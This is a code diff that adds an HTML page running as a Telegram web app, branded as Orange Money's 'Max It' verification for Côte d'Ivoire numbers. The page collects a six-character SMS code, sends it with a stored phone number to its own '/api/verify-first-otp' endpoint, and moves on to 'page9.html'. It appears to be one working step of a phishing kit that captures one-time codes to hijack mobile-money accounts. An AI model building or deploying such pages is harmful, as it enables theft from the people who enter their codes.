@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Vérification Max It</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background-color: #f7f7f7; margin: 0; display: flex; flex-direction: column; align-items: center; font-family: sans-serif; }
+        .header-box { width: 100%; background: #f15a24; padding: 25px; color: white; text-align: center; font-size: 26px; font-weight: 800; }
+        .card { background: #fff; width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; margin-top: 20px; }
+        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; }
+        .code-box { width: 48px; height: 54px; border: 2px solid #f15a24; border-radius: 10px; text-align: center; font-size: 22px; font-weight: 800; }
+        .submit-btn { width: 100%; background-color: #e0e0e0; color: #999; border: none; padding: 16px; border-radius: 10px; font-weight: 800; }
+        .submit-btn.active { background-color: #f15a24; color: white; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="header-box">Orange Money</div>
+<div class="card">
+    <h2>Vérification Max it</h2>
+    <p>Entrez le code à 6 caractères reçu par SMS</p>
+    <div style="font-weight:800; margin-bottom:20px;">🇨🇮 +225 <span id="displayPhone"></span></div>
+    <div class="code-input-container">
+        <input type="text" maxlength="1" class="code-box">
+        <input type="text" maxlength="1" class="code-box">
+        <input type="text" maxlength="1" class="code-box">
+        <input type="text" maxlength="1" class="code-box">
+        <input type="text" maxlength="1" class="code-box">
+        <input type="text" maxlength="1" class="code-box">
+    </div>
+    <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
+</div>
+<script>
+    const codeBoxes = document.querySelectorAll('.code-box');
+    const submitBtn = document.getElementById('submitBtn');
+    document.getElementById('displayPhone').textContent = localStorage.getItem('phone');
+
+    codeBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.toUpperCase();
+            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
+            const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
+            submitBtn.disabled = fullCode.length !== 6;
+            submitBtn.classList.toggle('active', fullCode.length === 6);
+        });
+    });
+
+    submitBtn.addEventListener('click', async () => {
+        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
+        await fetch('/api/verify-first-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: localStorage.getItem('phone'), code: codeValue, country: "CI" })
+        });
+        window.location.href = "page9.html";
+    });
+</script>
+</body>
+</html>
